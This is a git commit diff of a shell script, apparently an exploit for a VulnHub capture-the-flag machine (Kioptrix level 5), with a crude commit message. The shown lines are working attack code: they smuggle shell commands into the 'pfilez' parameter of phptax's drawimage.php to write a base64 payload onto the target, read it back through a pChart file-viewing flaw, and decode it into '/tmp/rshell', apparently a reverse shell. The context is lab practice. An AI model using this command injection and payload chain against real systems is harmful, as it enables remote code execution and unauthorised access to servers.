54a9c8f94ffbeca1bcc5e22fead79a3699924ce0
d34dfr4m3 <32407502+d34dfr4m3@users.noreply.github.com>
2020-01-19 08:11:55 -0300

    donethatshit
    fuckfuckyea

--- freakyou.sh
+++ freakyou.sh
@@ -22,10 +22,10 @@ function write(){
    URL="http://172.16.0.101:8080/phptax/drawimage.php?pfilez=1040ab-pg2.tob;echo%20$line%3E%3E$FILE;&pdf=make"
    echo "[-] Uploading: $line"
    curl -sq --user-agent "Mozilla/4.0 Mozilla4_browser" --retry 0 $URL &>/dev/null 
- done < /home/operador/Documents/CTF/vulnhub/kioptix_l5/payload/encode
+ done < payload/encode
  echo "[-] Upload Done"
  curl -qs "http://172.16.0.101/pChart2.1.3/examples/index.php?Action=View&Script=$FILE" | sed 's/<br \/>/\n/g' | sed 's/&amp;//g' | sed 's/&nbsp\;/ \& /g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | grep -vE "span|code"
- payload_size=`wc -l /home/operador/Documents/CTF/vulnhub/kioptix_l5/payload/encode | cut -d ' ' -f 1`
+ payload_size=`wc -l payload/encode | cut -d ' ' -f 1`
  echo "[+] Cleaning  and decoding the payload" 
  rce "cat $FILE | uniq | tail -n $payload_size | /usr/bin/b64decode -r > /tmp/rshell 2>/tmp/teste;"
  echo "[-] Payload is ready to kill"
